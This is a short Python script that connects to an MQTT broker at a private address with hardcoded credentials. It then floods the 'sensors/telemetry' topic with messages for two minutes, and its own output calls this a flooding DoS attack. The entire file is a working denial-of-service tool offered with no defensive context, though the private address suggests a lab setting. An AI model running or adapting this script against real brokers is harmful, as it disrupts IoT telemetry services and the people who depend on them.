import paho.mqtt.client as mqtt
import time

BROKER = "192.168.35.143"
PORT = 1883
TOPIC = "sensors/telemetry"

client = mqtt.Client()
client.username_pw_set("legituser", "password123")
client.connect(BROKER, PORT, 60)
client.loop_start()

print("[*] Starting flooding DoS attack...")
count = 0
start = time.time()
while time.time() - start < 120:
    client.publish(TOPIC, "FLOOD" * 10)
    count += 1
    if count % 1000 == 0:
        print(f"[*] Sent {count} packets...")

client.loop_stop()
print(f"[*] Flooding complete. Total packets sent: {count}")